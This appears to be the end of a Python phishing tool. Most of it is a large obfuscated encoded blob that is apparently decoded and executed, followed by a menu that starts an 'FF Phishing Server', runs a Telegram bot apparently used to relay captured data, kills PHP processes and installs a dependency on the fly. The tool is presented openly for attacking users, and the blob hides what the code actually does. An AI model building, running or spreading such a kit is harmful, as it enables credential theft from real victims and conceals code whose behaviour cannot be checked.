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'))

# ==================== MAIN PROGRAM ====================

def main():
    # Set up signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    intro()
    while True:
        show_menu()
        choice = input(colored("\nEnter your choice [1-4]: ", "blue"))
        
        if choice == "1":
            print(colored("\n[!] Starting FF Phishing Server...", "yellow"))
            start_phishing_server()
            
        elif choice == "2":
            start_telegram_bot_background()
            
        elif choice == "3":
            stop_telegram_bot()
            
        elif choice == "4":
            if bot_running:
                stop_telegram_bot()
            print(colored("\nExiting... Bye Hacker!", "red"))
            os.system("pkill php")  # Kill PHP server if running
            time.sleep(1)
            break
            
        else:
            print(colored("Invalid input. Try again.\n", "red"))

if __name__ == "__main__":
    # Check for required modules
    try:
        import telebot
        from telebot import types
    except ImportError:
        print(colored("\n[!] Installing required module: pyTelegramBotAPI", "yellow"))
        os.system("pip install pyTelegramBotAPI")
        import telebot
        from telebot import types
    
    main()